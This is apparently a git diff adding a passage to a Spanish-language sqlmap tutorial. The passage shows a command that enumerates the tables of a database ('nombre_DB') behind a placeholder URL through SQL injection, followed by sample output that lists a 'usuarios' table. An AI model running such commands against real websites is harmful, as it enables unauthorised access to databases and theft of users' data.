@@ -423,6 +423,36 @@ available databases [2]:
 [*] nombre_DB
 ```
 
+Con esto tenemos las bases de datos, en este ejemplo tenemos `2`:
+
+```
+[*] information_schema
+[*] nombre_DB
+```
+
+Ahora, vamos a entrar a la base de datos `nombre_DB` y estraerémos el nombre de las tablas:
+
+`sqlmap.py -u "http://www.paginaparaejemplo.com/algo.php?id=1&id2=1&id3=1" -D nombre_DB --tables`
+
+Al terminar el escaneo tenemos algo como esto:
+
+```
+[11:55:18] [INFO] the back-end DBMS is MySQL
+web server operating system: FreeBSD
+web application technology: Apache 2.2.22
+back-end DBMS: MySQL 5
+[11:55:18] [INFO] fetching tables for database: 'nombre_DB'
+[11:55:19] [INFO] heuristics detected web page charset 'ascii'
+[11:55:19] [INFO] the SQL query used returns 3 entries
+[11:55:20] [INFO] retrieved: usuarios
+[11:55:21] [INFO] retrieved: otra_tabla
+[11:55:21] [INFO] retrieved: hola_soy_otra_tabla
+```
+
+Al terminar tenemos las siguientes tablas:
+
+`usuarios, otra_tabla, hola_soy_otra_tabla`
+
 
 
 
